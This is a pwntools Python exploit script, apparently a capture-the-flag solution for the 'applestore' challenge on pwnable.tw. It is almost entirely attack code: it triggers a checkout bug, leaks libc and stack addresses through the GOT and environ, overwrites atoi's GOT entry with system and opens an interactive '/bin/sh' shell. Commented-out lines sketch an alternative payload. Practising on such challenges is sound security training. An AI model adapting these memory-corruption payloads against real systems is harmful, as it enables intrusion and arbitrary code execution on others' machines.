from pwn import *

DEBUG = 0

if DEBUG:
	p = process('./applestore')
	bin = ELF('./applestore')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('chall.pwnable.tw', 10104)
	bin = ELF('./applestore')
	libc = ELF('./libc_32.so.6')

def Add(item):    
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', item)

def Delete(item):
    p.sendlineafter('> ', '3')
    p.sendlineafter('> ', item)

def Check():
    p.sendlineafter('> ', '5')
    p.sendlineafter('> ', 'y')
    
#pass checkout
for i in range(20):
    Add('2')
for i in range(6):
    Add('1')

# get iPhone 8 - 1$
Check()

# leak libc address
payload = "27" + p32(bin.got['atoi']) + p32(0)*3
Delete(payload)
p.recvuntil('27:')
atoi_addess = u32((p.recvuntil(' ')[:4]))		
libc.address = atoi_addess - libc.symbols['atoi']

# leak stack address
payload = "27" + p32(libc.sym['environ']) + p32(0)*3
Delete(payload)
p.recvuntil('27:')
environ_address = u32((p.recvuntil(' ')[:4]))
ebp_address = environ_address - 0x104

# write ebp to atoi+0x22
payload = '27' + p32(0)*2 + p32(bin.got['atoi']+0x22) + p32(ebp_address-0x8)
Delete(payload)

# set the atoi got to system addr, and excute the system('/bin/sh')
payload = p32(libc.sym['system']) + ';/bin/sh\x00'
p.sendlineafter('> ', payload)
p.interactive()

# environ = u32((p.recvuntil(' ')[:4]))
# stack = environ - 0xe4
# ebp = environ - 0xc4
# sh = next(libc.search('sh\x00'))

# p.recvuntil('> ')
# p.sendline('3')
# p.recvuntil('> ') #item number
# p.sendline("27" + p32(libc.sym['gets']) + p32(0xdeadbeef) + p32(stack) + p32(ebp - 0x8))
# p.recvuntil('\n')

# p.recvuntil('> ')
# p.sendline('06' + p32(0xdeadbeef) + p32(libc.sym['system']) + p32(stack) + p32(sh))

# p.interactive()
